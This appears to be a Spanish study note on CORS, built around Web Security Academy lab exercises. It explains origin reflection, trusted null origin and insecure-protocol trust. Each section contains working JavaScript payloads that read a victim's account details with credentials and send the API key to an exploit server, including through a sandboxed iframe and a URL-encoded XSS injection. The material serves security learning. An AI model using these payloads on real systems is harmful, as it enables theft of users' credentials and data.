
------------
# Definición

>**Cross-origin Resource Sharing (CORS)** es un mecanismo de seguridad implementado en los navegadores web que permite o restringe las solicitudes realizadas desde un origen (dominio) diferente al del recurso al que se quiere acceder.

## ¿Por qué existe?

Por razones de seguridad. Los navegadores restringen las solicitudes HTTP entre diferentes orígenes para evitar ataques como el **Cross-Site Request Forgery (CSRF)**. CORS es una forma de relajar esas restricciones de forma controlada.

## ¿Cómo funciona?

Cuando una aplicación intenta hacer una solicitud "cross-origin", el navegador envía una petición especial llamada **preflight** (opcional, dependiendo del tipo de solicitud) con el método `OPTIONS`, para preguntar al servidor si permite la solicitud desde ese origen.

El servidor puede permitirla o denegarla enviando cabeceras específicas, como:

- `Access-Control-Allow-Origin`: Indica qué origen(es) pueden acceder.
    
- `Access-Control-Allow-Methods`: Métodos HTTP permitidos.
    
- `Access-Control-Allow-Headers`: Cabeceras que pueden usarse.

------------
# Vulnerabilidades CORS

## Basic origin reflection

- La web, ante una petición a un endpoint, devuelve información sensible, además de un par de cabeceras mal configuradas.
	![[request_basic_CORS.png]]
	![[response_basic_CORS.png]]
	`Access-Control-Allow-Origin` parece valer `*`, por lo que cualquier origen puede hacer peticiones a este endpoint.
	`Access-Control-Allow-Credentials: true` permite arrastrar credenciales.

	Con esta información, desde un servidor de atacante podemos introducir el siguiente código:
	``` html
	<script>
	var r = new XMLHttpRequest();
		r.open("GET", "https://0aec0075044233b980cd0838005e00e5.web-securityacademy.net/accountDetails", false);
	r.withCredentials = true;
	r.send();

	var r2 = new XMLHttpRequest();
	r2.open("GET", "https://exploit-0ace0071048e3375801d07950127004e.exploit-server.net/?apikey=" + btoa(r.responseText), true);
	r2.send();
	</script>
	```

	Lanzará una petición al endpoint para conseguir la APIKey, y después reenviará la respuesta al servidor de atacante.

## Trusted null origin

- Si el origen setteado a null se ve reflejado en la respuesta:
	``` java
	Access-Control-Allow-Origin: null
	```
	Se puede realizar la petición desde un **iframe** con un *sandbox*, lo que va a provocar que el valor de Origin sea null.

	Para ello, se hace uso del atributo *srcdoc* para introducir código javascript.
	``` html
	<iframe sandbox="allow-scripts" srcdoc="
		<script>
			var r = new XMLHttpRequest();
			r.open('GET', 'https://0a0d003a04ccd816801b35fa0044004c.web-security-academy.net/accountDetails', false);
			r.withCredentials = true;
			r.send();

			var r2 = new XMLHttpRequest();
			r2.open('GET', 'https://exploit-0ad70035042dd8b08043342f017600e7.exploit-server.net/?apikey=' + btoa(r.responseText), true);
			r2.send();
		</script>
	"></iframe>
	```

## Trusted insecure protocols

- Si dos subdominios están permitidos como origen a través de ciertos protocolos, como http / https, y ese dominio es vulnerable a XSS, se puede lanzar las peticiones desde ese subdominio.
	``` html
	<script>
		location = "http://stock.0aef005e041967e88069034b006a000b.web-security-academy.net/?productId=%3Cscript%3Evar%20r%20=%20new%20XMLHttpRequest();r.open(%27GET%27,%20%27https://0aef005e041967e88069034b006a000b.web-security-academy.net/accountDetails%27,%20false);r.withCredentials%20=%20true;r.send();var%20r2%20=%20new%20XMLHttpRequest();r2.open(%27GET%27,%20%27https://exploit-0a6700830456679380cf023001560021.exploit-server.net/?apikey=%27%20%2b%20btoa(r.responseText),%20true);r2.send();%3C/script%3E&storeId=1";
	</script>
	```